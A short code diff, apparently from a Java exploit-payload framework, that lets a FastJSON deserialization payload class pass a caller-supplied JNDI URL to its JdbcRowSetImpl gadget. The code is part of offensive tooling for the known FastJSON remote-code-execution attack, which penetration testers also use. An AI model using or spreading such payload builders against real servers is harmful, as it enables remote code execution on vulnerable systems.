@@ -18,7 +18,9 @@ public class FastJSONPayload1 extends FastJsonPayload {
 
     @Override
     public Bullet getDefaultBullet(Object... args) throws Exception {
-        return new JdbcRowSetImplJsonBullet();
+        Bullet bullet = new JdbcRowSetImplJsonBullet();
+        bullet.set("jndiURL", args[0]);
+        return bullet;
     }
 
     @Override
